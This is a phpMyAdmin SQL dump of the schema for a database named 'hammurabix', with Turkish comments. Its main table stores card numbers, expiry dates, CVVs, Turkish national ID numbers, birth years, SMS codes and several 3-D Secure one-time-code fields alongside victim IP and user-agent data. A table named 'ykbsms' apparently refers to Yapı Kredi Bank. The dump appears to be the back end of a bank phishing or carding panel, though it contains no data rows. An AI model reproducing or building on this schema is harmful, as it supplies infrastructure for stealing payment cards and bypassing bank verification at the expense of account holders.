-- phpMyAdmin SQL Dump
-- version 4.6.6
-- https://www.phpmyadmin.net/
--
-- Anamakine: localhost
-- Üretim Zamanı: 31 Eki 2019, 12:56:04
-- Sunucu sürümü: 5.7.17-log
-- PHP Sürümü: 5.6.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `hammurabix`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ayarlar`
--

CREATE TABLE `ayarlar` (
  `ayar_id` int(11) NOT NULL,
  `ayar_author` int(11) NOT NULL,
  `ayar_title` varchar(255) NOT NULL,
  `ayar_3d` int(11) NOT NULL,
  `3dayar` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `datalar`
--

CREATE TABLE `datalar` (
  `id` int(11) NOT NULL,
  `kart_no` varchar(255) NOT NULL,
  `kart_skt` varchar(255) NOT NULL,
  `kart_cvv` varchar(255) NOT NULL,
  `ses` varchar(255) NOT NULL,
  `ip` int(11) NOT NULL,
  `useral` varchar(255) NOT NULL,
  `referreral` varchar(255) NOT NULL,
  `musteri_tc` varchar(255) NOT NULL,
  `musteri_dogumyil` varchar(255) NOT NULL,
  `kart_durum` varchar(255) NOT NULL,
  `kart_tipi` varchar(255) NOT NULL,
  `smskod` varchar(255) NOT NULL,
  `3dsms` varchar(255) NOT NULL,
  `3dsms2` varchar(255) NOT NULL,
  `lastid` int(11) NOT NULL,
  `metin` varchar(255) NOT NULL,
  `3dsms3` varchar(255) NOT NULL,
  `allastaw` varchar(255) NOT NULL,
  `data_id` int(11) NOT NULL,
  `notif` varchar(255) NOT NULL,
  `tarih` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ykbsms`
--

CREATE TABLE `ykbsms` (
  `id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `ayarlar`
--
ALTER TABLE `ayarlar`
  ADD PRIMARY KEY (`ayar_id`);

--
-- Tablo için indeksler `datalar`
--
ALTER TABLE `datalar`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `ykbsms`
--
ALTER TABLE `ykbsms`
  ADD PRIMARY KEY (`id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `ayarlar`
--
ALTER TABLE `ayarlar`
  MODIFY `ayar_id` int(11) NOT NULL AUTO_INCREMENT;
--
-- Tablo için AUTO_INCREMENT değeri `datalar`
--
ALTER TABLE `datalar`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- Tablo için AUTO_INCREMENT değeri `ykbsms`
--
ALTER TABLE `ykbsms`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
